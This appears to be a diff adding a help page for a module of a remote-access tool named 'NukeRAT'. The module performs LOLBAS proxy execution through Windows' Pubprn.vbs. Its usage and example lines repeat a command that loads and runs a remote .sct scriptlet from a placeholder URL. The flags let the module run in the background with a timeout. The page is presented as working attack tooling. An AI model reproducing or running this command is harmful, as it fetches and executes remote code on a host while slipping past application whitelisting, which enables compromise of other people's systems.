@@ -1,0 +1,16 @@
+ABOUT
+    Proxy execution with Pubprn.vbs. LOLBAS documents proxy
+    execution.
+
+USAGE:
+    pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+
+EXAMPLES:
+    pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
